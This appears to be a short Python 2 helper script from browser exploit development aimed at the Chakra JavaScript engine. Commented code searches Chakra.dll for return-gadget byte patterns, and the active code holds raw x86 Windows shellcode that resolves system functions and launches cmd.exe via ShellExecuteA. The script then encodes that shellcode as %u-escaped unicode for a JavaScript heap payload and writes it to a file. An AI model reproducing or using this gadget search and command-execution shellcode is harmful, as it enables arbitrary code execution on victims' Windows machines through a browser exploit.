
# data = open('Chakra.dll', 'rb').read()

# key = [0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57]
# key = [0x50 + i for i in range(0x10)]
# for i in range(len(data)):
	# if ord(data[i]) == 0xc3:
		# if ord(data[i-1]) in key and ord(data[i-2]) in key and ord(data[i-3]) == 0x5d:
			# print data[i-2:i+1].encode('hex')
			
# a = [0x8b64db31, 0x7f8b307b, 0x1c7f8b0c, 0x8b08478b, 0x3f8b2077, 0x330c7e80, 0xc789f275, 0x8b3c7803, 0xc2017857, 0x01207a8b, 0x8bdd89c7, 0xc601af34, 0x433e8145, 0x75616572, 0x087e81f2, 0x7365636f, 0x7a8be975, 0x66c70124, 0x8b6f2c8b, 0xc7011c7a, 0xfcaf7c8b, 0xd989c701, 0xe253ffb1, 0x616368fd, 0xe289636c, 0x53535252, 0x53535353, 0xd7ff5352]

# b = ''
# for n in a:
	# b += '%u{}%u{}'.format(1, 1)
	
# %udb31%u8b64%u307b%u7f8b%u8b0c%u1c7f%u478b%u8b08%u2077%u3f8b%u7e80%u330c%uf275%uc789%u7803%u8b3c%u7857%uc201%u7a8b%u0120%u89c7%u8bdd%uaf34%uc601%u8145%u433e%u6572%u7561%u81f2%u087e%u636f%u7365%ue975%u7a8b%u0124%u66c7%u2c8b%u8b6f%u1c7a%uc701%u7c8b%ufcaf%uc701%ud989%uffb1%ue253%u68fd%u6163%u636c%ue289%u5252%u5353%u5353%u5353%u5352%ud7ff
	
a = "\x31\xc9\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x70\x14\xad\x96\xad\x8b\x58\x10\x8b\x53\x3c\x01\xda\x8b\x52\x78\x01\xda\x8b\x72\x20\x01\xde\x31\xc9\x41\xad\x01\xd8\x81\x38\x47\x65\x74\x50\x75\xf4\x81\x78\x04\x72\x6f\x63\x41\x75\xeb\x81\x78\x08\x64\x64\x72\x65\x75\xe2\x8b\x72\x24\x01\xde\x66\x8b\x0c\x4e\x49\x8b\x72\x1c\x01\xde\x8b\x14\x8e\x01\xda\x31\xf6\x89\xd6\x31\xff\x89\xdf\x31\xc9\x51\x68\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68\x4c\x6f\x61\x64\x54\x53\xff\xd2\x83\xc4\x0c\x31\xc9\x68\x65\x73\x73\x42\x88\x4c\x24\x03\x68\x50\x72\x6f\x63\x68\x45\x78\x69\x74\x54\x57\x31\xff\x89\xc7\xff\xd6\x83\xc4\x0c\x31\xc9\x51\x68\x64\x6c\x6c\x41\x88\x4c\x24\x03\x68\x6c\x33\x32\x2e\x68\x73\x68\x65\x6c\x54\x31\xd2\x89\xfa\x89\xc7\xff\xd2\x83\xc4\x0b\x31\xc9\x68\x41\x42\x42\x42\x88\x4c\x24\x01\x68\x63\x75\x74\x65\x68\x6c\x45\x78\x65\x68\x53\x68\x65\x6c\x54\x50\xff\xd6\x83\xc4\x0d\x31\xc9\x68\x65\x78\x65\x41\x88\x4c\x24\x03\x68\x63\x6d\x64\x2e\x54\x59\x31\xd2\x42\x52\x31\xd2\x52\x52\x51\x52\x52\xff\xd0\xff\xd7"
print len(a)
b = ''
for i in range(len(a) / 2):
	b += '%u{}'.format(a[i*2:i*2+2][::-1].encode('hex'))
	
open('shellcode.ttt', 'wb').write(b)